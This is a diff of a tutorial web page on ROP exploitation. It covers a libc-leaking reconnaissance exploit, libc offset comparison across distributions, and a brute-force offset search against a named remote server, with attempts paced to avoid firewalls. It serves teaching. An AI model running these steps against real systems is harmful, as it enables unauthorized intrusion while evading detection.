 <p>This reveals that the IP is owned by Google, so we could guess that it hosted somewhere at Google. If Google Compute Engine, then it’s likely one of the <a class="reference external" href="https://cloud.google.com/compute/docs/images">GCE Images</a>. For each of these images, create a VM and measure the offset both before and after patches, resulting in a range of offset values for exploit. And that would result in success as the vulnerable server is a Debian 9 image from GCE.</p>
 </div>
 <div class="section" id="do-a-reconnaissance-exploit">
-<h4>9.5.2.3.3. Do a reconnaissance exploit<a class="headerlink" href="#do-a-reconnaissance-exploit" title="Permalink to this headline">¶</a></h4>
+<h3>9.5.5.4. Do a reconnaissance exploit<a class="headerlink" href="#do-a-reconnaissance-exploit" title="Permalink to this headline">¶</a></h3>
 <p>Another approach is to change the exploit payload to instead print out some information about the server, in this case the puts offset in libc.</p>
-<ol class="arabic">
-<li><p class="first">We write a second reconnaisance exploit: instead of doing the buffer overflow exploit we can use <code class="docutils literal"><span class="pre">printf</span></code> to output the actual addresses of <code class="docutils literal"><span class="pre">puts</span></code> and <code class="docutils literal"><span class="pre">__libc_start_main</span></code> on the vulnerable server. Given those addresses we can compare them to other <strong class="program">libc</strong>’s corresponding values to see which one is most like the vulnerable server’s <strong class="program">libc</strong>. Here is the reconnaisance exploit coded completely in python. (The main exploit only used python to create the input file, which was <code class="docutils literal"><span class="pre">cat</span></code>-ed via a pipe to <code class="docutils literal"><span class="pre">socat</span></code>. Here, no <code class="docutils literal"><span class="pre">cat</span></code> is needed.)</p>
+<div class="section" id="from-bash-shell-exploit-to-printf-reconnaissance">
+<h4>9.5.5.4.1. From bash shell exploit to printf reconnaissance<a class="headerlink" href="#from-bash-shell-exploit-to-printf-reconnaissance" title="Permalink to this headline">¶</a></h4>
+<p>We write a reconnaisance exploit: instead of doing the buffer overflow exploit we can use <code class="docutils literal"><span class="pre">printf</span></code> to output the actual addresses of <code class="docutils literal"><span class="pre">puts</span></code> and <code class="docutils literal"><span class="pre">__libc_start_main</span></code> on the vulnerable server. Given those addresses we can compare them to other <strong class="program">libc</strong>’s corresponding values to see which one is most like the vulnerable server’s <strong class="program">libc</strong>. Here is the reconnaisance exploit coded completely in python. (The main exploit only used python to create the input file, which was <code class="docutils literal"><span class="pre">cat</span></code>-ed via a pipe to <code class="docutils literal"><span class="pre">socat</span></code>. Here, no <code class="docutils literal"><span class="pre">cat</span></code> is needed.)</p>
 <p>Download <a class="reference download internal" href="../_downloads/libc-recon.py" download=""><code class="xref download docutils literal"><span class="pre">libc-recon.py</span></code></a> and make it executable (<code class="docutils literal"><span class="pre">chmod</span> <span class="pre">+x</span> <span class="pre">libc-recon.py</span></code>):</p>
 <div class="highlight-python"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
 
@@ -1245,6 +1283,9 @@ id
 </pre></div>
 </div>
 <p>A word of warning about this reconnaissance: the application segfaults and a simple <code class="docutils literal"><span class="pre">sudo</span> <span class="pre">dmesg</span> <span class="pre">|</span> <span class="pre">tail</span></code> shows the segfault. Anybody doing log analysis will pick up the fact that <em>something</em> is going wrong.</p>
+</div>
+<div class="section" id="testing-the-reconnaissance-locally">
+<h4>9.5.5.4.2. Testing the reconnaissance locally<a class="headerlink" href="#testing-the-reconnaissance-locally" title="Permalink to this headline">¶</a></h4>
 <p>We first run the exploit locally, getting the correct offset for <code class="docutils literal"><span class="pre">puts</span></code> in <strong class="program">libc</strong>. First, in a separate terminal start up our local “server”:</p>
 <div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> socat tcp4-listen:8080,bind<span class="o">=</span><span class="m">127</span>.0.0.1,reuseaddr,fork exec:./prog
 </pre></div>
@@ -1261,6 +1302,9 @@ id
 <span class="go">0x4eac0</span>
 </pre></div>
 </div>
+</div>
+<div class="section" id="vulnerable-server-reconnaissance">
+<h4>9.5.5.4.3. Vulnerable server reconnaissance<a class="headerlink" href="#vulnerable-server-reconnaissance" title="Permalink to this headline">¶</a></h4>
 <p>Next we run it against the vulnerable server to get <code class="docutils literal"><span class="pre">puts</span></code>’s offset in <strong class="program">libc</strong>.</p>
 <div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~$</span> ./libc-recon.py meetup.bitbender.org <span class="m">8080</span>
 </span><span class="go">puts = 0xf757d880</span>
@@ -1268,16 +1312,16 @@ id
 <span class="hll"><span class="go">puts offset = 0x47700</span>
 </span></pre></div>
 </div>
-</li>
-</ol>
 <p>This shows the puts offset is 0x47700 in GCE and locally 0x4eac0, or a ratio of 0.908. We could use this to predict the offset of execve from puts: 0.908 * 0x56cc0 = 0x4ed00 (rounded from 0x4ecfc) vs the actual 0x51dd0. Since libc routine addresses are a multiple of 16 (last 4 bits are 0), then the guess if off by (0x51dd0 - 0x4ed00)/16 = 781, or 781 steps away from the initial guess. If you started at 0x4ed00 and made steps of 16 above &amp; below the starting value, you would find the offset after 781 * 2 + 1 = 1563 steps. So we would have to run a little under 1600 brute force guesses before success.</p>
 <p>We could improve our initial guess by doing reconnaissance of all the libc values in the vulnerable program: fflush, printf, scanf, and puts. From there we might be able to reason a better first guess. But we won’t do that here.</p>
 </div>
+</div>
 <div class="section" id="major-libc-stats">
-<h4>9.5.2.3.4. Major libc stats<a class="headerlink" href="#major-libc-stats" title="Permalink to this headline">¶</a></h4>
+<h3>9.5.5.5. Major libc stats<a class="headerlink" href="#major-libc-stats" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="a-script-to-analyze-libc-s">
+<h4>9.5.5.5.1. A script to analyze libc’s<a class="headerlink" href="#a-script-to-analyze-libc-s" title="Permalink to this headline">¶</a></h4>
 <p>Another approach is to look at the major libc’s (CentOS, Debian, Ubuntu, …) and compare their numbers to those observed from the reconnaisance results above.</p>
-<ol class="arabic">
-<li><p class="first">First download <a class="reference download internal" href="../_downloads/libc-offset-so.sh" download=""><code class="xref download docutils literal"><span class="pre">libc-offset-so.sh</span></code></a> and make it executable (<code class="docutils literal"><span class="pre">chmod</span> <span class="pre">+x</span> <span class="pre">libc-offset-so.sh</span></code>):</p>
+<p>First download <a class="reference download internal" href="../_downloads/libc-offset-so.sh" download=""><code class="xref download docutils literal"><span class="pre">libc-offset-so.sh</span></code></a> and make it executable (<code class="docutils literal"><span class="pre">chmod</span> <span class="pre">+x</span> <span class="pre">libc-offset-so.sh</span></code>):</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>
 
 <span class="k">if</span> <span class="o">[[</span> <span class="nv">$#</span> !<span class="o">=</span> <span class="s2">&quot;3&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
@@ -1303,8 +1347,10 @@ id
 <span class="nb">echo</span> offset <span class="nv">$FUNC2</span> - <span class="nv">libc</span> <span class="o">=</span> <span class="nv">$offset2</span>
 </pre></div>
 </div>
-</li>
-<li><p class="first">First use <strong class="program">libc-offset-so.sh</strong> to analyze the Debian 9 <strong class="program">libc</strong> <a class="reference external" href="https://packages.debian.org/stable/libs/libc6">Package: libc6 (2.24-11+deb9u1)</a>.  (Note: .deb and .udeb package files can be extracted using <code class="docutils literal"><span class="pre">ar</span> <span class="pre">p</span> <span class="pre">DEBFILE</span> <span class="pre">data.tar.xz</span> <span class="pre">|</span> <span class="pre">tar</span> <span class="pre">-Jx</span></code>.):</p>
+</div>
+<div class="section" id="debian-9-libc">
+<h4>9.5.5.5.2. Debian 9 libc<a class="headerlink" href="#debian-9-libc" title="Permalink to this headline">¶</a></h4>
+<p>First use <strong class="program">libc-offset-so.sh</strong> to analyze the Debian 9 <strong class="program">libc</strong> <a class="reference external" href="https://packages.debian.org/stable/libs/libc6">Package: libc6 (2.24-11+deb9u1)</a>.  (Note: .deb and .udeb package files can be extracted using <code class="docutils literal"><span class="pre">ar</span> <span class="pre">p</span> <span class="pre">DEBFILE</span> <span class="pre">data.tar.xz</span> <span class="pre">|</span> <span class="pre">tar</span> <span class="pre">-Jx</span></code>.):</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>mkdir libc_debian9
 <span class="nb">cd</span> libc_debian9
 curl -s -O <span class="se">\</span>
@@ -1330,8 +1376,10 @@ ar p libc*.udeb data.tar.xz <span class="p">|</span> tar -Jx
 </span><span class="hll"><span class="go">offset puts - libc = 0x476f0</span>
 </span></pre></div>
 </div>
-</li>
-<li><p class="first">Next analyze the Ubuntu 16.04 LTS <strong class="program">libc</strong> offset.</p>
+</div>
+<div class="section" id="ubuntu-16-04-lts-libc">
+<h4>9.5.5.5.3. Ubuntu 16.04 LTS libc<a class="headerlink" href="#ubuntu-16-04-lts-libc" title="Permalink to this headline">¶</a></h4>
+<p>Next analyze the Ubuntu 16.04 LTS <strong class="program">libc</strong> offset.</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>mkdir libc_ubuntu_16.04
 <span class="nb">cd</span> libc_ubuntu_16.04
 curl -s -O <span class="se">\</span>
@@ -1357,8 +1405,10 @@ ar p libc*.deb data.tar.xz <span class="p">|</span> tar -Jx
 </span><span class="hll"><span class="go">offset puts - libc = 0x46c00</span>
 </span></pre></div>
 </div>
-</li>
-<li><p class="first">For the Centos 7 i386 <strong class="program">libc</strong>:</p>
+</div>
+<div class="section" id="centos-7-libc">
+<h4>9.5.5.5.4. Centos 7 libc<a class="headerlink" href="#centos-7-libc" title="Permalink to this headline">¶</a></h4>
+<p>For the Centos 7 i386 <strong class="program">libc</strong>:</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># rpm needs rpm2cpio to unpack</span>
 sudo apt install rpm2cpio -y
 
@@ -1395,8 +1445,10 @@ rpm2cpio glibc-*.rpm <span class="p">|</span> cpio --quiet -idm
 </span><span class="hll"><span class="go">offset puts - libc = 0x4b410</span>
 </span></pre></div>
 </div>
-</li>
-<li><p class="first">We see the <strong class="program">libc</strong>’s <code class="docutils literal"><span class="pre">execve</span> <span class="pre">/</span> <span class="pre">puts</span></code> offset ratio is around 1.09 or 1.14 (depending on the distribution):</p>
+</div>
+<div class="section" id="libc-summary-and-a-guess">
+<h4>9.5.5.5.5. libc summary and a guess<a class="headerlink" href="#libc-summary-and-a-guess" title="Permalink to this headline">¶</a></h4>
+<p>We see the <strong class="program">libc</strong>’s <code class="docutils literal"><span class="pre">execve</span> <span class="pre">/</span> <span class="pre">puts</span></code> offset ratio is around 1.09 or 1.14 (depending on the distribution):</p>
 <table border="1" class="colwidths-given docutils" id="id23">
 <caption><span class="caption-text">libc execve offset ratios</span><a class="headerlink" href="#id23" title="Permalink to this table">¶</a></caption>
 <colgroup>
@@ -1441,14 +1493,12 @@ rpm2cpio glibc-*.rpm <span class="p">|</span> cpio --quiet -idm
 </tbody>
 </table>
 <p>So we pull a guess of 0x51700 assuming Ubuntu/Debian server. The guess from the reconnaissance program was 0x4ed00. Given the actual answer is 0x51dd0, this guess is far better. It’s low by 109 guesses, meaning a search centered around the guess would take 219 guesses before success - a huge reduction in the search space.</p>
-</li>
-</ol>
+</div>
 </div>
 <div class="section" id="brute-force-vulnerable-server-search">
-<h4>9.5.2.3.5. Brute force vulnerable server search<a class="headerlink" href="#brute-force-vulnerable-server-search" title="Permalink to this headline">¶</a></h4>
-<p>So now we must show how to search an offset range. We’ll start with the range [0x00051db0, 0x00051de0] to save time. Since we don’t want to trip off firewalls, the attempts will be spaced 30 seconds apart, and waiting for 219 guesses (a little under 2 hours) is a bit long for our demo.</p>
-<ol class="arabic">
-<li><p class="first">Here’s a script that runs over a range of <strong class="program">libc</strong> offsets trying to find the correct offset. Download <a class="reference download internal" href="../_downloads/search-range.sh" download=""><code class="xref download docutils literal"><span class="pre">search-range.sh</span></code></a> and make it executable (<code class="docutils literal"><span class="pre">chmod</span> <span class="pre">+x</span> <span class="pre">search-range.sh</span></code>). Note that it waits waits 30 seconds between tries. (If you don’t wait some amount of time between attempts you’ll find yourself locked out of the site for some time.)</p>
+<h3>9.5.5.6. Brute force vulnerable server search<a class="headerlink" href="#brute-force-vulnerable-server-search" title="Permalink to this headline">¶</a></h3>
+<p>So now we must show how to search an offset range. Since we don’t want to trip off firewalls, the attempts will be spaced 30 seconds apart, and waiting for 219 guesses (a little under 2 hours) is a bit long for our demo. So we’ll start with the range [0x00051db0, 0x00051de0] to save time.</p>
+<p>Here’s a script that runs over a range of <strong class="program">libc</strong> offsets trying to find the correct offset. Download <a class="reference download internal" href="../_downloads/search-range.sh" download=""><code class="xref download docutils literal"><span class="pre">search-range.sh</span></code></a> and make it executable (<code class="docutils literal"><span class="pre">chmod</span> <span class="pre">+x</span> <span class="pre">search-range.sh</span></code>). Note that it waits waits 30 seconds between tries. (If you don’t wait some amount of time between attempts you’ll find yourself locked out of the site for some time.)</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>
 
 <span class="c1"># Run a test over a range of libc offsets.</span>
@@ -1498,12 +1548,10 @@ rpm2cpio glibc-*.rpm <span class="p">|</span> cpio --quiet -idm
 <span class="go">(rop) hacker@kali:~$</span>
 </pre></div>
 </div>
-</li>
-</ol>
 </div>
 </div>
 <div class="section" id="understanding-rop">
-<h3>9.5.2.4. Understanding ROP<a class="headerlink" href="#understanding-rop" title="Permalink to this headline">¶</a></h3>
+<h2>9.5.6. Understanding ROP<a class="headerlink" href="#understanding-rop" title="Permalink to this headline">¶</a></h2>
 <p>Here are some key concepts that you should understand now that you’ve seen the exploit:</p>
 <ul>
 <li><p class="first">Now you can see why it’s called ROP (return-oriented programming).</p>
@@ -1530,7 +1578,6 @@ rpm2cpio glibc-*.rpm <span class="p">|</span> cpio --quiet -idm
 <p>The stack pointer esp is essentially our instruction pointer and the stack pointer at the same time. So when we have a pointer to a <strong class="program">libc</strong> routine to execute, the stack must have the return address followed by the calling arguments. That return address must be a gadget that pop’s off the following calling arguments. If not, an exception will result when the arguments are attempted to be called.</p>
 </li>
 </ul>
-</div>
 </div>
 </div>
 
